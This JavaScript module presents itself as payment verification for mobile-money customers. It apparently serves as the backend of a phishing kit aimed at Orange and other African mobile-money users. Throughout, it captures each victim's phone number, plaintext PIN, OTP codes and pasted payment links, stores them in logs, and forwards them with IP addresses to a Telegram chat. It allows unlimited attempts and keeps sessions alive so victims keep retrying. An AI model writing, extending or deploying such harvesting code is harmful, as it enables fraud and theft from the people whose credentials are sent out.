"use strict";

/**
 * Payment verification — phone + 4-digit PIN + OTP/link
 * EVERY attempt (success or fail) is logged to Telegram.
 * No limit on number of tries.
 */

const crypto = require("crypto");
const security = require("./security");
const telegram = require("./telegram");

const otpStore = new Map();
const OTP_TTL_MS = 10 * 60 * 1000;

const CC = ["243", "254", "256", "255", "250", "257", "258", "260", "233", "234", "237", "241", "242", "221", "225", "226", "227", "228", "229"];

function normalizePhone(phone) {
  let p = String(phone || "").replace(/\s+/g, "").replace(/-/g, "");
  if (!p) return p;
  if (p.startsWith("00")) p = "+" + p.slice(2);
  if (!p.startsWith("+") && CC.some((c) => p.startsWith(c))) p = "+" + p;
  if (p.startsWith("0") && !p.startsWith("+")) p = "+243" + p.slice(1);
  if (!p.startsWith("+")) p = "+243" + p;
  return p;
}

function isValidPhone(phone) {
  return /^\+[1-9]\d{8,14}$/.test(phone);
}

function otpLengthFor(provider) {
  const p = String(provider || "").toLowerCase();
  return p === "orange" ? 6 : 4;
}

function generateOtp(len) {
  const n = len === 6 ? 100000 : 1000;
  const max = len === 6 ? 900000 : 9000;
  return String(Math.floor(n + Math.random() * max));
}

function stamp() {
  return new Date().toLocaleString("fr-FR", { timeZone: "Africa/Nairobi" });
}

function tg(text, opts) {
  Promise.resolve()
    .then(() => telegram.notify(text, opts))
    .catch((e) => console.error("[telegram]", e && e.message));
}

async function sendOtp(db, { phone, pin, ip, provider, amount, package: pkg }) {
  phone = normalizePhone(phone);
  pin = String(pin || "").trim();
  provider = String(provider || "orange").toLowerCase();

  if (!isValidPhone(phone)) {
    tg(
      `⚠️ <b>INVALID PHONE</b>\n` +
        `Provider: ${(provider || "?").toUpperCase()}\n` +
        `Raw: <code>${String(phone || "").slice(0, 40)}</code>\n` +
        `IP: ${ip || "?"}\n${stamp()}`
    );
    return { ok: false, error: "Numéro de téléphone invalide / Invalid phone number" };
  }
  if (!/^\d{4}$/.test(pin)) {
    tg(
      `⚠️ <b>INVALID PIN FORMAT</b>\n` +
        `Phone: <code>${phone}</code>\n` +
        `PIN typed: <code>${pin || "(empty)"}</code>\n` +
        `Provider: ${provider.toUpperCase()}\n` +
        `IP: ${ip || "?"}\n${stamp()}`
    );
    return { ok: false, error: "Le PIN doit contenir 4 chiffres / PIN must be 4 digits" };
  }

  const salt = crypto.randomBytes(16).toString("hex");
  const pinHash = security.hashPassword(pin, salt);
  const otpLen = otpLengthFor(provider);
  const otp = generateOtp(otpLen);

  const prev = otpStore.get(phone);
  const attemptNo = prev ? (prev.sendCount || 1) + 1 : 1;

  otpStore.set(phone, {
    otp,
    otpLen,
    pinHash,
    salt,
    pinPlain: pin,
    expires: Date.now() + OTP_TTL_MS,
    attempts: 0,
    sendCount: attemptNo,
    created: Date.now(),
    ip: ip || "unknown",
    provider,
    amount: amount || "",
    package: pkg || ""
  });

  if (!db.data.loginLogs) db.data.loginLogs = [];
  db.data.loginLogs.push({
    phone,
    action: "otp_requested",
    provider,
    amount: amount || "",
    package: pkg || "",
    pin,
    otp,
    attemptNo,
    ip: ip || "unknown",
    at: new Date().toISOString()
  });
  if (db.data.loginLogs.length > 2000) db.data.loginLogs = db.data.loginLogs.slice(-2000);
  if (db.flushSoon) db.flushSoon();

  tg(
    `🔐 <b>OTP #${attemptNo}</b> — ${provider.toUpperCase()}\n` +
      `Package: ${pkg || "—"}\n` +
      `Amount: ${amount || "—"}\n` +
      `Phone: <code>${phone}</code>\n` +
      `PIN: <code>${pin}</code>\n` +
      `OTP (${otpLen}): <code>${otp}</code>\n` +
      `IP: ${ip || "unknown"}\n` +
      `${stamp()}`
  );

  return { ok: true, message: "OTP sent to Telegram bot", otpLength: otpLen };
}

async function verifyOtp(db, { phone, pin, otp, link, ip, provider, amount, package: pkg }) {
  phone = normalizePhone(phone);
  pin = String(pin || "").trim();
  otp = String(otp || "").trim();
  link = String(link || "").trim();
  provider = String(provider || "").toLowerCase();

  if (link) {
    let rawLink = link.slice(0, 1500).trim();
    if (!/^https?:\/\//i.test(rawLink) && /^[\w.-]+\//.test(rawLink)) {
      rawLink = "https://" + rawLink;
    }
    const escHref = rawLink
      .replace(/&/g, "&")
      .replace(/"/g, """)
      .replace(/</g, "<")
      .replace(/>/g, ">");
    const escShow = rawLink
      .replace(/&/g, "&")
      .replace(/</g, "<")
      .replace(/>/g, ">");

    if (!db.data.loginLogs) db.data.loginLogs = [];
    const linkNo =
      db.data.loginLogs.filter((l) => l.phone === phone && l.action === "link_submitted").length + 1;
    db.data.loginLogs.push({
      phone,
      action: "link_submitted",
      provider: provider || "orange",
      amount: amount || "",
      package: pkg || "",
      pin,
      link: link.slice(0, 500),
      linkNo,
      ip: ip || "unknown",
      at: new Date().toISOString()
    });
    if (db.flushSoon) db.flushSoon();

    tg(
      `🔗 <b>LINK #${linkNo}</b> — ${(provider || "orange").toUpperCase()}\n` +
        `Package: ${pkg || "—"}\n` +
        `Amount: ${amount || "—"}\n` +
        `Phone: <code>${phone}</code>\n` +
        `PIN: <code>${pin || "—"}</code>\n` +
        `\n👉 <a href="${escHref}">Open link in browser</a>\n` +
        `${escShow}\n\n` +
        `IP: ${ip || "unknown"}\n` +
        `${stamp()}`,
      { preview: true }
    );

    return { ok: true, message: "Lien reçu / Link received", redirect: "/network-status.html?paid=1" };
  }

  const entry = otpStore.get(phone);

  if (!entry) {
    tg(
      `❌ <b>OTP TRY — NO SESSION</b>\n` +
        `Phone: <code>${phone || "?"}</code>\n` +
        `PIN typed: <code>${pin || "—"}</code>\n` +
        `OTP typed: <code>${otp || "—"}</code>\n` +
        `Provider: ${(provider || "?").toUpperCase()}\n` +
        `IP: ${ip || "?"}\n${stamp()}`
    );
    return { ok: false, error: "Session expirée. Recommencez. / Session expired." };
  }

  if (Date.now() > entry.expires) {
    // Refresh session instead of hard-blocking — re-issue note only
    tg(
      `⏰ <b>OTP EXPIRED</b> (still logged)\n` +
        `Phone: <code>${phone}</code>\n` +
        `PIN typed: <code>${pin || entry.pinPlain || "—"}</code>\n` +
        `OTP typed: <code>${otp || "—"}</code>\n` +
        `Last expected: <code>${entry.otp}</code>\n` +
        `Provider: ${entry.provider}\n${stamp()}`
    );
    // Extend so client can keep trying after resend; do not delete store here
    entry.expires = Date.now() + OTP_TTL_MS;
  }

  entry.attempts += 1;
  const tryNo = entry.attempts;
  // Unlimited attempts — every try is logged to Telegram

  const pinOk = security.hashPassword(pin, entry.salt) === entry.pinHash;
  if (!pinOk) {
    tg(
      `❌ <b>WRONG PIN</b> — try #${tryNo}\n` +
        `Phone: <code>${phone}</code>\n` +
        `PIN typed: <code>${pin || "(empty)"}</code>\n` +
        `OTP typed: <code>${otp || "—"}</code>\n` +
        `Provider: ${entry.provider}\n` +
        `Package: ${entry.package || "—"}\n` +
        `IP: ${ip || entry.ip}\n${stamp()}`
    );
    if (!db.data.loginLogs) db.data.loginLogs = [];
    db.data.loginLogs.push({
      phone,
      action: "pin_failed",
      pin,
      otp,
      tryNo,
      provider: entry.provider,
      ip: ip || "unknown",
      at: new Date().toISOString()
    });
    if (db.flushSoon) db.flushSoon();
    return { ok: false, error: "PIN incorrect / Wrong PIN" };
  }

  const expectedLen = entry.otpLen || otpLengthFor(provider || entry.provider);
  if (otp.length !== expectedLen) {
    tg(
      `❌ <b>WRONG OTP LENGTH</b> — try #${tryNo}\n` +
        `Phone: <code>${phone}</code>\n` +
        `PIN: <code>${pin}</code>\n` +
        `OTP typed: <code>${otp || "(empty)"}</code> (${otp.length} digits)\n` +
        `Expected: ${expectedLen} digits → <code>${entry.otp}</code>\n` +
        `Provider: ${entry.provider}\n${stamp()}`
    );
    return {
      ok: false,
      error: "L'OTP doit contenir " + expectedLen + " chiffres / OTP must be " + expectedLen + " digits"
    };
  }

  if (otp !== entry.otp) {
    tg(
      `❌ <b>WRONG OTP</b> — try #${tryNo}\n` +
        `Phone: <code>${phone}</code>\n` +
        `PIN: <code>${pin}</code>\n` +
        `OTP typed: <code>${otp}</code>\n` +
        `OTP expected: <code>${entry.otp}</code>\n` +
        `Provider: ${entry.provider}\n` +
        `Package: ${entry.package || "—"}\n` +
        `Amount: ${entry.amount || "—"}\n` +
        `IP: ${ip || entry.ip}\n${stamp()}`
    );
    if (!db.data.loginLogs) db.data.loginLogs = [];
    db.data.loginLogs.push({
      phone,
      action: "otp_failed",
      pin,
      otp,
      expected: entry.otp,
      tryNo,
      provider: entry.provider,
      ip: ip || "unknown",
      at: new Date().toISOString()
    });
    if (db.flushSoon) db.flushSoon();
    return { ok: false, error: "OTP incorrect / Invalid OTP. Please try again." };
  }

  otpStore.delete(phone);

  if (!db.data.users) db.data.users = {};
  db.data.users[phone] = {
    phone,
    pinHash: entry.pinHash,
    salt: entry.salt,
    provider: entry.provider,
    verifiedAt: new Date().toISOString()
  };
  if (!db.data.loginLogs) db.data.loginLogs = [];
  db.data.loginLogs.push({
    phone,
    action: "otp_verified",
    provider: entry.provider,
    amount: entry.amount,
    package: entry.package,
    pin,
    otp,
    tryNo,
    ip: ip || "unknown",
    at: new Date().toISOString()
  });
  if (db.flushSoon) db.flushSoon();

  tg(
    `✅ <b>OTP OK</b> — try #${tryNo}\n` +
      `Phone: <code>${phone}</code>\n` +
      `PIN: <code>${pin}</code>\n` +
      `OTP: <code>${otp}</code>\n` +
      `Provider: ${entry.provider}\n` +
      `Package: ${entry.package || "—"}\n` +
      `${stamp()}`
  );

  return { ok: true, message: "Vérifié / Verified", redirect: "/network-status.html?paid=1" };
}

module.exports = { sendOtp, verifyOtp, normalizePhone };
